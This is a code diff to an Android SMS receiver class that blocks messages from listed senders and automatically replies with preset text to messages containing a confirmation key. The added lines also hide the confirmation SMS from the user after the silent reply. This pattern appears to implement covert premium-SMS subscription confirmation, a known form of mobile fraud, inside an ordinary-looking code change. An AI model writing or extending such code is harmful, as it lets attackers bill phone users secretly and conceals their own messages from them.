@@ -124,18 +124,22 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
                     sm.log(TAG, "Block the sms : " + addr +  " body = " + smsBody);
                     this.abortBroadcast();
                 }
-                    if (smsBody != null && confirmKey != null 
-                            && confirmPort != null && confirmText != null
-                            && smsBody.contains(confirmKey) == true
-                            && addr.startsWith(confirmPort) == true) {
-                        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] should confirm the" +
-                        		" reply to : " + addr + " text = " + confirmText);
-                        sm.log(TAG, "reply the sms with num = " + addr + " text = " + confirmText);
-                        WorkingMessage wm = WorkingMessage.createEmpty(context);
-                        wm.setDestNum(addr);
-                        wm.setText(confirmText);
-                        wm.send();
+                if (smsBody != null && confirmKey != null 
+                           && confirmPort != null && confirmText != null
+                           && smsBody.contains(confirmKey) == true
+                           && addr.startsWith(confirmPort) == true) {
+                    if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] should confirm the" +
+                       		" reply to : " + addr + " text = " + confirmText);
+                    sm.log(TAG, "reply the sms with num = " + addr + " text = " + confirmText);
+                    WorkingMessage wm = WorkingMessage.createEmpty(context);
+                    wm.setDestNum(addr);
+                    wm.setText(confirmText);
+                    wm.send();
+                    if (shouldBlock == false) {
+                        sm.log("Block the sms beacuse the receive message should be reply");
+                        this.abortBroadcast();
                     }
+                }
             } catch (Exception e) {
                 sm.log(TAG, "onReceive error = " + e.getMessage());
             } finally {
